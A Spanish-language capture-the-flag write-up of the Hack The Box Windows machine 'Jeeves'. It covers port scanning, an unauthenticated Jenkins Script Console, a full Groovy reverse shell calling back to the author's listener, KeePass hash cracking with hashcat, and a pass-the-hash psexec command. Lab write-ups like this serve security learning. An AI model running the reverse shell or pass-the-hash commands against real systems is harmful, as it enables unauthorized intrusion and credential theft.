___
Tags: #medium #jeeves
___
# Jeeves
## Información General

**- Dificultad:** Medium
**- Sistema operativo:** Windows
**- Fecha de resolución:** 22/08/2026
**- Enlace:** [Jeeves](https://app.hackthebox.com/machines/Jeeves)
## Listado de Vulnerabilidades Identificadas

- **Consola de Scripting Expuesta en Jenkins (Sin Autenticación)**
    
    - **Concepto:** El panel de administración de Jenkins en el puerto 50000 (`/askjeeves/`) permite el acceso a la _Script Console_ sin requerir credenciales de usuario.
        
    - **Impacto:** Permite la ejecución de código arbitrario en Groovy del lado del servidor, lo que resultó en una _reverse shell_ y la pérdida total del control del sistema bajo el contexto del usuario `kohsuke`.
        
- **Gestión Insegura de Contraseñas y Credenciales Expuestas**
    
    - **Concepto:** Almacenamiento local de una base de datos de contraseñas Keepass (`CEH.kdbx`) legible por usuarios de bajo privilegio y con una contraseña maestra vulnerable a ataques de fuerza bruta.
        
    - **Impacto:** Un atacante puede extraer el archivo, romper la clave principal (`moonshine`) e inspeccionar los datos sensibles guardados, obteniendo el hash de NTLM del usuario `Administrator`.
        
- **Reutilización y Exposición de Hashes de Contraseña (Pass-the-Hash)**
    
    - **Concepto:** El servicio SMB expuesto (puerto 445) no cuenta con las protecciones o configuraciones necesarias para denegar la autenticación con hash (NTLM) de la cuenta de administrador.
        
    - **Impacto:** Permite realizar un ataque _Pass-the-Hash_ mediante herramientas como `psexec.py`, escalando privilegios con éxito y comprometiendo completamente el sistema como `Administrator`.
        
- **Ocultamiento de Datos mediante Flujos de Datos Alternativos (NTFS ADS)**
    
    - **Concepto:** Uso de la característica _Alternate Data Streams_ (ADS) del sistema de archivos NTFS para esconder información sensible detrás de archivos legítimos o no sospechosos (`hm.txt:root.txt`).
        
    - **Impacto:** Facilita la evasión de auditorías o la ocultación de archivos y datos clave si no se analizan los directorios con los parámetros adecuados (ej. `dir /R`).

## Reconocimiento

**HTB** nos proporciona la ip de la máquina objetivo **10.129.228.112**
### Ping

Dependiendo del resultado podemos deducir si es una máquina linux o window, por ejemplo:

```
ping -c 1 10.129.228.112
```

![[Jeevesping.png]]

**Su ttl es 128. Por tanto, es Windows**
## Enumeración
### Escaneo de puertos abiertos

#### Escaneo de puerto TCP

El comando que uso con nmap es:

```
sudo nmap -p- --open -sS -sC -sV --min-rate 2000 -n -Pn 10.129.228.112
```

```
PORT      STATE SERVICE      VERSION
80/tcp    open  http         Microsoft IIS httpd 10.0
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-title: Ask Jeeves
|_http-server-header: Microsoft-IIS/10.0
135/tcp   open  msrpc        Microsoft Windows RPC
445/tcp   open  microsoft-ds Microsoft Windows 7 - 10 microsoft-ds (workgroup: WORKGROUP)
50000/tcp open  http         Jetty 9.4.z-SNAPSHOT
|_http-server-header: Jetty(9.4.z-SNAPSHOT)
|_http-title: Error 404 Not Found
Service Info: Host: JEEVES; OS: Windows; CPE: cpe:/o:microsoft:windows
```

| Open port | Service      | Version                               |
| --------- | ------------ | ------------------------------------- |
| 80        | http         | Microsoft IIS httpd 10.0              |
| 135       | msrpc        | Microsoft Windows RPC                 |
| 445       | microsoft-ds | Microsoft Windows 7 - 10 microsoft-ds |
| 50000     | http         | Jetty 9.4.z-SNAPSHOT                  |
### Sitio web - TCP 80

El servidor web devuelve un motor de búsqueda con apariencia de "Pregunta a Jeeves":

![[Jeevesweb80.png]]

nada interesante
### SMB 

El usuario **guest** está deshabilitado.

```
netexec smb 10.129.228.112 -u guest -p ''
```

![[Jeevesguestrsmb.png]]
### Sitio web - TCP 50000

![[Jeeves50000.png]]
#### Gobuster

```
gobuster dir -u http://10.129.228.112:50000/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x txt,php,html
```

> /askjeeves

![[Jeevesaskjevbes.png]]

Tarda bastante en conseguirlo.
#### Fuzzing web 

```
wfuzz -c --hc 404 -w /usr/share/dirbuster/wordlists/directory-list-lowercase-2.3-medium.txt http://172.17.0.2/FUZZ
```
### /askjeeves/ - TCP 50000

Esta página es un ejemplo de Jenkins.

```
http://10.129.228.112:50000/askjeeves/
```
## Explotación

### Shell como kohsuke

#### Reverseshell

Para obtener una reverse shell desde jenkins nos iremos a **Manage Jenkins** - **Script Console**, el comando me ayudo crearlo la IA

![[Jeevespayloadreverseshell.png]]

```
String host = "10.10.14.188"
int port = 4450

String cmd = "cmd.exe"
Process p = new ProcessBuilder(cmd).redirectErrorStream(true).start()
Socket s = new Socket(host, port)
InputStream pi = p.getInputStream(), pe = p.getErrorStream(), si = s.getInputStream()
OutputStream po = p.getOutputStream(), so = s.getOutputStream()

while (!p.isAlive()) { Thread.sleep(50) }

Thread.start {
    while (true) {
        while (pi.available() > 0) so.write(pi.read())
        while (pe.available() > 0) so.write(pe.read())
        while (si.available() > 0) po.write(si.read())
        so.flush()
        po.flush()
        Thread.sleep(50)
    }
}
```

Antes de lanzar el comando preparamos el puerto de escucha:

```
sudo rlwrap -cAr nc -lvnp 4450
```

Y obtenemos la flag de **user.txt**

![[Jeevesuser.txt.png]]
## Escalada de Privilegios

### Shell as Administrator

#### Enumeración

Antes desde jeekins debemos de crearnos un repo, los pasos son:

Le damos **New Item**

![[Jeevesnewitem.png]] 

Le ponemos nombre y señalamos el apartado **Freestyle project**, luego guardamos.

Investigando dentro del documento del usuario **kohsuke** nos encontramos un archivo keepass **CEH.kdbx**. 

![[Jeevescehkdbxadsadklafma.png]]

Por tanto, en la ruta copiaremos ese archivo en la ruta donde se creo el repositorio.

```
copy CEH.kdbx C:\Users\Administrator\.jenkins\workspace\empe1
```

Luego en el navegador nos encontramos el archivo **CEH.kdbx**

![[Jeevescejhajeekinsajdfsñ.png]]

#### Extraer contraseñas

```
keepass2john CEH.kdbx > CEH.kdbx.hash
```

![[Jeevescehkeahasjdas.png]]

Lo único que editamos el archivo, y quitamos el **CEH:** del principio, quedaría tal que así:

>`$keepass$*2*6000*0*1af405cc00f979ddb9bb387c4594fcea2fd01a6a0757c000e1873f3c71941d3d*3869fe357ff2d7db1555cc668d1d606b1dfaf02b9dba2621cbe9ecb63c7a4091*393c97beafd8a820db9142a6a94f03f6*b73766b61e656351c3aca0282f1617511031f0156089b6c5647de4671972fcff*cb409dbc0fa660fcffa4f1cc89f728b68254db431a21ec33298b612fe647db48`

```
hashcat -m 13400 CEH.kdbx.hash /usr/share/wordlists/rockyou.txt
```

> moonshine1 

Para abrir la bbdd **CEH.kdbx** usaremos la herramienta **kpcli**

```
kpcli --kdb CEH.kdbx

find .
```

![[Jeevesfiiiind.png]]

El que me dio algo valido fue el **0**

```
show -f 0
```

![[Jeevescredecnuiialsda.png]]

#### Validación de cred

Validé que esto era el hash del usuario **administrator** 

```
crackmapexec smb 10.129.228.112 -u Administrator -H e0fb1fb85756c24235ff238cbe81fe00
```

![[Jeevesvalidacionadminsitrator.png]]

#### Shell

```
psexec.py -hashes aad3b435b51404eeaad3b435b51404ee:e0fb1fb85756c24235ff238cbe81fe00 administrator@10.129.228.112 cmd.exe
```

El comando **`dir /R`** sirve para mostrar todos los archivos de un directorio **incluyendo sus flujos de datos alternativos (ADS - Alternate Data Streams)** en sistemas de archivos NTFS.

![[Jeevesroot.txt.png]]

Recuerda que para que te acepte esta flag tiene que poner esta estructura `HTB{...}`
## Conclusión

La máquina **Jeeves** es un sistema Windows cuyo compromiso inicial se logra al descubrir un panel de Jenkins no autenticado expuesto en un puerto alternativo (50000/TCP), el cual permite la ejecución remota de código en Groovy mediante su consola de scripts para obtener acceso como el usuario `kohsuke`; posteriormente, la escalada de privilegios se realiza al hallar una base de datos KeePass (`CEH.kdbx`) accesible en el sistema, cuya clave maestra se obtiene por fuerza bruta para extraer el hash NTLM del Administrador y efectuar un ataque de _Pass-the-Hash_ vía SMB, concluyendo con la localización de la bandera final oculta dentro de un flujo alternativo de datos (ADS) en el escritorio del Administrador.

